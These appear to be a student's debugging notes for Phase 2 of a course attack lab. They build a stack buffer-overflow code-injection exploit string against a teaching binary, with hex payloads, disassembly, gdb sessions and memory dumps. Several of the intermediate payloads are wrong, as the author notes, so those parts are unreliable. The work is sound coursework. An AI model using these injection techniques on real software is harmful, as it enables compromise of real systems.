@@ -1,0 +1,655 @@
+Phase 2 / Level 2
+------------------
+input:
+
+48 8b 3c 25 a1 8d 61 55     /* mov    0x55618da1,%rdi  # pass cookie as arg */
+c3                          /* ret */
+44 f0 31 32 00 00 00 00     /* cookie */
+00 00 00 00 00 00 00        /* fill rest of buffer */
+98 8d 61 55 00 00 00 00     /* adr of injected code above (start of input) */
+ff 5d 55 55 55 55 00 00     /* adr of touch2 */
+
+--------------------------------------------------------
+- involves injecting a small amount of code as part of exploit string
+
+- get ctarget to execute code for touch2 rather than returning to test 
+- make it appear to touch2 that the cookie was passed as an argument
+
+notes:
+- position byte representation of address of injected code so that retq at
+    the end of getbuf() will transfer control to it
+- first argument to function is passed in reg %rdi
+- injected code should set the reg to the given cookie, then use ret to
+    transfer control to the first instruction in touch2
+- do not attempt to use jmp or call instructions in exploit code. use ret for
+    all transfers of control
+
+
+-------------------------------------------------------- C functions
+
+// touch 2
+void touch2(unsigned val) {
+    vlevel = 2;             /* Part of validation protocol */
+
+    if (val == cookie) {
+        printf("Touch2!: You called touch2(0x%.8x)\n", val);
+        validate(2);
+    } 
+    else {
+        printf("Misfire: You called touch2(0x%.8x)\n", val);
+        fail(2);
+    }
+    exit(0);
+}
+
+
+-------------------------------------------------------- test assembly file
+
+// test.s:
+
+# Example of hand-generated assembly code
+pushq   $0xabcdef   # Push value onto stack
+addq    $17,%rax    # Add 17 to %rax
+movl    %eax,%edx   # Copy lower 32 bits to %edx
+
+
+// assemble code
+unix> gcc -c test.s
+// disassemble
+unix> objdump -d test.o > test.d
+
+
+// test.d:
+
+test.o:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	68 ef cd ab 00       	push   $0xabcdef
+   5:	48 83 c0 11          	add    $0x11,%rax
+   9:	89 c2                	mov    %eax,%edx
+
+
+// therefore, "68 ef cd ab 00 48 83 c0 11 89 c2" would be valid input to pass 
+//      through hex2raw in order to inject this code
+
+
+-------------------------------------------------------- process
+
+input:
+- string of characters + null to fill buffer
+- address of inserted code
+- code injection to make %rdi reg (function argument) = cookie
+- code injection to make (return address) = touch2 address
+- code injection for ret
+
+// 
+
+rsp = input
+rdi = arguments
+rsp = return address
+
+
+getbuf =    0x0000555555555db1
+test =      0x0000555555555fa0
+touch2 =    0x0000555555555dff
+touch1 =    0000000000001dcb
+
+
+// --------------- input format
+./hex2raw < strs.txt > exploits.txt         // hex from strs --> raw in exploits
+python3 str_to_hex.py                       // raw from strs --> hex in strs
+
+// --------------- run gdb
+gdb ctarget
+    run < exploits.txt -q
+
+// --------------- .gdbinit breakpoints
+nano ~/.gdbinit
+
+-------------------------------------------------------- disass functions
+
+
+// getbuf (objdump)
+0000000000001db1 <getbuf>:
+    1db1:	f3 0f 1e fa          	endbr64 
+    1db5:	48 83 ec 18          	sub    $0x18,%rsp
+    1db9:	48 89 e7             	mov    %rsp,%rdi
+    1dbc:	e8 bb 02 00 00       	callq  207c <Gets>
+    1dc1:	b8 01 00 00 00       	mov    $0x1,%eax
+    1dc6:	48 83 c4 18          	add    $0x18,%rsp
+    1dca:	c3                   	retq   
+// getbuf (disass)
+Dump of assembler code for function getbuf:
+   0x0000555555555db1 <+0>:	endbr64 
+   0x0000555555555db5 <+4>:	sub    $0x18,%rsp
+   0x0000555555555db9 <+8>:	mov    %rsp,%rdi
+   0x0000555555555dbc <+11>:	callq  0x55555555607c <Gets>
+   0x0000555555555dc1 <+16>:	mov    $0x1,%eax
+   0x0000555555555dc6 <+21>:	add    $0x18,%rsp
+=> 0x0000555555555dca <+25>:	retq   
+End of assembler dump.
+
+
+
+
+// test
+0000000000001fa0 <test>:
+    1fa0:	f3 0f 1e fa          	endbr64 
+    1fa4:	48 83 ec 08          	sub    $0x8,%rsp
+    1fa8:	b8 00 00 00 00       	mov    $0x0,%eax
+    1fad:	e8 ff fd ff ff       	callq  1db1 <getbuf>
+    1fb2:	89 c2                	mov    %eax,%edx
+    1fb4:	48 8d 35 9d 23 00 00 	lea    0x239d(%rip),%rsi        # 4358 <_IO_stdin_used+0x358>
+    1fbb:	bf 01 00 00 00       	mov    $0x1,%edi
+    1fc0:	b8 00 00 00 00       	mov    $0x0,%eax
+    1fc5:	e8 e6 f3 ff ff       	callq  13b0 <__printf_chk@plt>
+    1fca:	48 83 c4 08          	add    $0x8,%rsp
+    1fce:	c3                   	retq   
+// test
+Dump of assembler code for function test:
+   0x0000555555555fa0 <+0>:	endbr64 
+   0x0000555555555fa4 <+4>:	sub    $0x8,%rsp
+   0x0000555555555fa8 <+8>:	mov    $0x0,%eax
+   0x0000555555555fad <+13>:	callq  0x555555555db1 <getbuf>
+   0x0000555555555fb2 <+18>:	mov    %eax,%edx
+   0x0000555555555fb4 <+20>:	lea    0x239d(%rip),%rsi        # 0x555555558358
+   0x0000555555555fbb <+27>:	mov    $0x1,%edi
+   0x0000555555555fc0 <+32>:	mov    $0x0,%eax
+   0x0000555555555fc5 <+37>:	callq  0x5555555553b0 <__printf_chk@plt>
+   0x0000555555555fca <+42>:	add    $0x8,%rsp
+   0x0000555555555fce <+46>:	retq   
+End of assembler dump.
+
+
+
+
+// touch2
+0000000000001dff <touch2>:
+    1dff:	f3 0f 1e fa          	endbr64 
+    1e03:	50                   	push   %rax
+    1e04:	58                   	pop    %rax
+    1e05:	48 83 ec 08          	sub    $0x8,%rsp
+    1e09:	89 fa                	mov    %edi,%edx
+    1e0b:	c7 05 c7 55 00 00 02 	movl   $0x2,0x55c7(%rip)        # 73dc <vlevel>
+    1e12:	00 00 00 
+    1e15:	39 3d c9 55 00 00    	cmp    %edi,0x55c9(%rip)        # 73e4 <cookie>
+    1e1b:	74 2a                	je     1e47 <touch2+0x48>
+    1e1d:	48 8d 35 bc 24 00 00 	lea    0x24bc(%rip),%rsi        # 42e0 <_IO_stdin_used+0x2e0>
+    1e24:	bf 01 00 00 00       	mov    $0x1,%edi
+    1e29:	b8 00 00 00 00       	mov    $0x0,%eax
+    1e2e:	e8 7d f5 ff ff       	callq  13b0 <__printf_chk@plt>
+    1e33:	bf 02 00 00 00       	mov    $0x2,%edi
+    1e38:	e8 a1 05 00 00       	callq  23de <fail>
+    1e3d:	bf 00 00 00 00       	mov    $0x0,%edi
+    1e42:	e8 b9 f5 ff ff       	callq  1400 <exit@plt>
+    1e47:	48 8d 35 6a 24 00 00 	lea    0x246a(%rip),%rsi        # 42b8 <_IO_stdin_used+0x2b8>
+    1e4e:	bf 01 00 00 00       	mov    $0x1,%edi
+    1e53:	b8 00 00 00 00       	mov    $0x0,%eax
+    1e58:	e8 53 f5 ff ff       	callq  13b0 <__printf_chk@plt>
+    1e5d:	bf 02 00 00 00       	mov    $0x2,%edi
+    1e62:	e8 a3 04 00 00       	callq  230a <validate>
+    1e67:	eb d4                	jmp    1e3d <touch2+0x3e>
+// touch2
+Dump of assembler code for function touch2:
+   0x0000555555555dff <+0>:	endbr64 
+   0x0000555555555e03 <+4>:	push   %rax
+   0x0000555555555e04 <+5>:	pop    %rax
+   0x0000555555555e05 <+6>:	sub    $0x8,%rsp
+   0x0000555555555e09 <+10>:	mov    %edi,%edx
+   0x0000555555555e0b <+12>:	movl   $0x2,0x55c7(%rip)        # 0x55555555b3dc <vlevel>
+   0x0000555555555e15 <+22>:	cmp    %edi,0x55c9(%rip)        # 0x55555555b3e4 <cookie>
+   0x0000555555555e1b <+28>:	je     0x555555555e47 <touch2+72>
+   0x0000555555555e1d <+30>:	lea    0x24bc(%rip),%rsi        # 0x5555555582e0
+   0x0000555555555e24 <+37>:	mov    $0x1,%edi
+   0x0000555555555e29 <+42>:	mov    $0x0,%eax
+   0x0000555555555e2e <+47>:	callq  0x5555555553b0 <__printf_chk@plt>
+   0x0000555555555e33 <+52>:	mov    $0x2,%edi
+   0x0000555555555e38 <+57>:	callq  0x5555555563de <fail>
+   0x0000555555555e3d <+62>:	mov    $0x0,%edi
+   0x0000555555555e42 <+67>:	callq  0x555555555400 <exit@plt>
+   0x0000555555555e47 <+72>:	lea    0x246a(%rip),%rsi        # 0x5555555582b8
+   0x0000555555555e4e <+79>:	mov    $0x1,%edi
+   0x0000555555555e53 <+84>:	mov    $0x0,%eax
+   0x0000555555555e58 <+89>:	callq  0x5555555553b0 <__printf_chk@plt>
+   0x0000555555555e5d <+94>:	mov    $0x2,%edi
+   0x0000555555555e62 <+99>:	callq  0x55555555630a <validate>
+   0x0000555555555e67 <+104>:	jmp    0x555555555e3d <touch2+62>
+End of assembler dump.
+
+
+-------------------------------------------------------- 
+getbuf =    0x0000555555555db1
+test =      0x0000555555555fa0
+touch2 =    0x0000555555555dff
+touch1 =    0x0000555555555dcb
+
+0x55618d98: ff 5d 55 55 55 55 00 00     /* addr touch2 */
+0x55618da0: 48 8b 3c 25 44 f0 31 32     /* mov cookie -> %rdi (arg) */
+0x55618da8: 48 2b 24 25 08 c3 00 00     /* set rtn addr = 0x55618d98, ret */
+0x55618db0: a0 8d 61 55 00 00 00 00     /* 0x55618da0 */
+
+
+# test for code injection
+mov     0x3231f044, %rdi                # move cookie to %rdi (function arg)
+add     0x8, %rsp                       # make rtn address = touch2 address
+retq
+
+
+ff 5d 55 55 55 55 00 00     /* address of touch2 */
+48 8b 3c 25 44 f0 31 32     /* mov cookie to func arg (%rdi) */
+48 2b 24 25 08              /* set rtn addr (%rsp) to location of touch1 addr */
+c3                          /* return */
+00 00
+a0 8d 61 55 00 00 00 00     /* address of injection code above */
+
+--------
+getbuf =    0x0000555555555db1
+test =      0x0000555555555fa0
+touch2 =    0x0000555555555dff
+cookie =    0x3231f044
+------- new input assuming the issue is because i set rdi to cookie instead
+of an address
+
+
+0x55618d98: [addr touch1]
+0x55618da0: [cookie]
+0x55618da8: [sub 0x18 from rsp, ret]
+0x55618db0: a0 8d 61 55 00 00 00 00     /* 0x55618da0 */
+
+
+ff 5d 55 55 55 55 00 00     /* address of touch2 */
+48 8b 3c 25 44 f0 31 32     /* mov cookie to func arg (%rdi) */
+48 2b 24 25 08              /* set rtn addr (%rsp) to location of touch1 addr */
+c3                          /* return */
+00 00
+a8 8d 61 55 00 00 00 00     /* address of injection code above */
+
+0x55618d98: [addr touch1]
+0x55618da0: [cookie]
+0x55618da8: [anything]
+0x55618db0: a0 8d 61 55 00 00 00 00     /* 0x55618da0 */
+
+// assuming the issue was the cookie part, it should return task 2 but just 
+// without the right arg -- ok that did not work so mayeb it is (also?) bc its outside 
+// a function? or bc the assembly code is wrong (oh its probably that)
+// (twas iindeed my assembly code being wrong)
+
+--------
+
+0x55618d98: [cookie]
+0x55618da0: [mov ^ addr -> rdi]
+0x55618da8: ret
+0x55618db0: a0 8d 61 55 00 00 00 00     /* 0x55618da0 */
+0x55618db8: [addr touch1]
+
+
+0x55618d98: mov cookie to rdi
+0x55618d9c: ret
+0x55618d9d: cookie
+0x55618da4: 00 00 00 -----
+0x55618db0: adr ^ 
+0x55618db8: [addr touch1]
+
+
+
+
+48 8b 3d 05        /* mov cookie to func arg (%rdi) */
+c3                          /* return */
+44 f0 31 32 00 00 00 00     /* cookie */
+00 00 00 00 00 00 00 00
+00 00 00
+a0 8d 61 55 00 00 00 00     /* address of injection code above */
+ff 5d 55 55 55 55 00 00     /* address of touch2 */
+
+------
+
+# test for code injectionWatchpoint 4: $rip
+
+Old value = (void (*)()) 0x555555555dca <getbuf+25>
+New value = (void (*)()) 0x55618d98
+
+Watchpoint 6: $rsp
+
+Old value = (void *) 0x55618db0
+New value = (void *) 0x55618db8
+0x0000000055618d98 in ?? ()
+
+mov     0x55618d98, %rdi               # move cookie to %rdi (function arg)
+add     0x, %rsp                       # make rtn address = touch2 address
+retq
+
+
+--cookie = 0x3231f044
+44 f0 31 32 00 00 00 00
+
+0x55618d98: 
+0x55618da0: 
+0x55618da8: 
+0x55618db0: 
+
+48 8b 3c 25 a1 8d 61 55 	/* mov    0x55618da1,%rdi */
+c3                          /* ret */
+44 f0 31 32 00 00 00 00     /* cookie */
+00 00 00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ff 5d 55 55 55 55 00 00
+
+mov     0x1(%rip),%rdi
+
+
+
+
+
+------------ test 1 
+
+- get disass functions and addresses
+- get visualization of registers and things, buffer_size
+- write assembly injection code
+- compile and get objdump of injection code
+- combine full input in hex and pass thru hex2raw
+
+---------
+test input:
+keeeeeeeeeeeeea             
+6b 65 65 65 65 65 65 65 65 65 65 65 65 65 61 00
+
+// format input
+nano strs.txt           // keeeeeeeeeeeeea
+python3 str_to_hex.py
+./hex2raw < strs.txt > exploits.txt
+
+
+
+
+----- get disass functions and addresses
+gdb ctarget
+    b *(getbuf+16)
+    b *(getbuf+25)
+    b *(test+18)
+    run < exploits.txt -q
+
+getbuf =    0x0000555555555db1
+test =      0x0000555555555fa0
+touch2 =    0x0000555555555dff
+
+// also can use:
+watch $rsp
+
+
+----- get visualization of registers and things, buffer_size
+//need color in these notes its hard to read without separation
+    // break at getbuf line 16
+i r rsp = 0x55618d98
+x/64xb $rsp
+i r rdi = 0x7ffff7fa0980      140737353746816
+i r rip = 0x555555555dc1      0x555555555dc1 <getbuf+16>
+i r eax = 0x55618d98          1432456600
+
+
+(gdb) x/64xb $rsp
+0x55618d98:	0x6b	0x65	0x65	0x65	0x65	0x65	0x65	0x65    // buffer / input
+0x55618da0:	0x65	0x65	0x65	0x65	0x65	0x65	0x61	0x00
+0x55618da8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+
+0x55618db0:	0xb2	0x5f	0x55	0x55	0x55	0x55	0x00	0x00    // return address
+
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dc0:	0x11	0x66	0x55	0x55	0x55	0x55	0x00	0x00
+(gdb) i symbol 0x0000555555556611
+launch + 156 in section .text of /home/fiona/target42/ctarget
+//ok then 
+0x55618dc8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dd0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+
+
+
+    // break at getbuf line 25
+i r rsp = 0x55618db0
+x/16xb $rsp
+
+
+(gdb) x/16xb $rsp
+0x55618db0:	0xb2	0x5f	0x55	0x55	0x55	0x55	0x00	0x00    // return address
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+// return address for test line 18(0x0000555555555fb2)
+
+
+
+    // break at test
+i r rsp = 0x55618db8
+x/16xb $rsp
+
+
+(gdb) x/32xb $rsp
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dc0:	0x11	0x66	0x55	0x55	0x55	0x55	0x00	0x00
+0x55618dc8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dd0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+
+
+
+
+----- write injection code for input
+
+// %rsp (line 16 in getbuf):
+0x55618d98: 66 66 66 66 66 66 66 66
+0x55618da0: 66 66 66 66 66 66 66 66
+0x55618da8: 66 66 66 66 66 66 66 00     /* end of buffer */
+0x55618db0: cb 5d 55 55 55 55 00 00     /* return address */
+
+
+// input ish
+0x55618d98: [touch2 address]
+0x55618da0: [move cookie -> %rdi]
+0x55618da8: [sub 8 from %rsp, ret]          /* end of buffer */
+0x55618db0: [0x55618da0 (address above)]    /* return address */
+
+mov     0x3231f044, %rdi                # move cookie to %rdi (function arg)
+sub     0x8, %rsp                       # make rtn address = touch2 address
+retq
+
+inp start (&touch2 addr) = 0x55618d98
+inp code = 0x55618da0
+touch2 =    0x0000555555555dff
+
+
+----- combine full input in hex and pass thru hex2raw
+
+// test.s:
+
+# test for code injection
+#   gcc -c test.s
+#   objdump -d test.o > test.d
+mov     0x3231f044, %rdi                # move cookie to %rdi (function arg)
+sub     0x8, %rsp                       # make rtn address = touch2 address
+retq
+
+// test.d:
+test.o:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 8b 3c 25 44 f0 31 	mov    0x3231f044,%rdi
+   7:	32 
+   8:	48 2b 24 25 08 00 00 	sub    0x8,%rsp
+   f:	00 
+  10:	c3                   	ret    
+
+
+// hex:
+ff 5d 55 55 55 55 00 00     /* address of touch2 */
+48 8b 3c 25 44 f0 31 32     /* mov cookie to func arg (%rdi) */
+48 2b 24 25 08 00 00 00     /* set rtn addr (%rsp) to location of touch1 addr */
+c3                          /* return */
+
+
+
+--------------------------------------------- test input
+
+/*      strs.txt:
+ff 5d 55 55 55 55 00 00     /* address of touch2 */
+48 8b 3c 25 44 f0 31 32     /* mov cookie to func arg (%rdi) */
+48 2b 24 25 08              /* set rtn addr (%rsp) to location of touch1 addr */
+c3                          /* return */
+00 00
+a0 8d 61 55 00 00 00 00     /* address of injection code above */
+*/
+
+nano strs.txt
+python3 str_to_hex.py
+./hex2raw < strs.txt > exploits.txt
+
+/*      exploits.txt:
+�]UUUU^@^@H�<%D�12H+$%^H�^@^@��aU^@^@^@^@
+*/
+
+
+----- run gdb
+gdb ctarget
+    b *(getbuf+16)
+    b *(getbuf+25)
+    b *(test+18)
+    b touch2
+    run < exploits.txt -q
+
+
+----- break getbuf 16
+watch $rdi
+watch $rsp
+
+// get registers
+i r rsp = 0x55618d98
+x/32xb $rsp
+i r rdi = 0x7ffff7fa0980      140737353746816
+i r rip = 0x555555555dc1      0x555555555dc1 <getbuf+16>
+
+
+// rsp should be:
+ff 5d 55 55 55 55 00 00 
+48 8b 3c 25 44 f0 31 32 
+48 2b 24 25 08 c3 00 00
+a0 8d 61 55 00 00 00 00
+
+(gdb) x/32xb $rsp
+0x55618d98:	0xff	0x5d	0x55	0x55	0x55	0x55	0x00	0x00
+0x55618da0:	0x48	0x8b	0x3c	0x25	0x44	0xf0	0x31	0x32
+0x55618da8:	0x48	0x2b	0x24	0x25	0x08	0xc3	0x00	0x00
+0x55618db0:	0xa0	0x8d	0x61	0x55	0x00	0x00	0x00	0x00
+
+----- break getbuf 25
+i r rsp = 0x55618db0
+x/16xb $rsp
+i r rip = 0x555555555dca      0x555555555dca <getbuf+25>
+
+// rsp should be::
+a0 8d 61 55 00 00 00 00
+00 00 00 00 00 00 00 00
+
+(gdb) x/16xb $rsp
+0x55618db0:	0xa0	0x8d	0x61	0x55	0x00	0x00	0x00	0x00
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+
+
+--- step
+// %rip should be 
+0x55618da0          // move cookie to rdi
+
+
+Watchpoint 6: $rsp
+Old value = (void *) 0x55618db0
+New value = (void *) 0x55618db8
+0x0000000055618da0 in ?? ()
+
+// why 
+
+
+
+--- step
+// %rip should be 
+0x55618da8          // sub from rsp (set rtn addr)
+
+// rdi should be = 0x3231f044
+i r rdi = 
+x/16xb $rdi
+
+
+--- step
+// %rip should be 
+0x55618dad          // ret
+
+// rsp should be = 0x55618d98
+i r rsp = 
+x/16xb $rsp
+
+
+------------------
+Watchpoint 3: $rip
+Old value = (void (*)()) 0x555555555dca <getbuf+25>
+New value = (void (*)()) 0x55618da0
+0x0000000055618da0 in ?? ()
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000055618da0 in ?? ()
+
+// probably issue with assembly code then. an addr maybe
+// maybe bc outside of a function
+
+// oh nvm its bc i gave it not an address (maybe?) rdi
+
+------------------
+
+b *(getbuf+16)
+b touch2
+run < exploits.txt -q
+watch $rip
+x/16xb $rsp
+
+
+
+0x55618d98: [addr touch1]
+0x55618da0: [cookie]
+0x55618da8: [sub 0x18 from rsp, ret]
+0x55618db0: a0 8d 61 55 00 00 00 00     /* 0x55618da0 */
+
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dc0:	0x11	0x66	0x55	0x55	0x55	0x55	0x00	0x00
+0x55618dc8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dd0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+
+-------------------
+rip seq:
+0x0000555555555dc6
+0x0000555555555dca
+0x55618da80
+0x55618dac
+
+
+rsp seq:
+0x55618d98
+0x55618db0
+0x55618d98
+
+----------------------------------
+
+
+b *(getbuf+25)
+b touch2
+run < exploits.txt -q
+
+watch $rip
+watch $rdi
+watch $rsp
+
+x/16xb $rdi
+
+
+
+
+rip seq:
+0x555555555dca
+0x55618d98
+
+rsp seq:
+0x55618db0
+0x55618db8
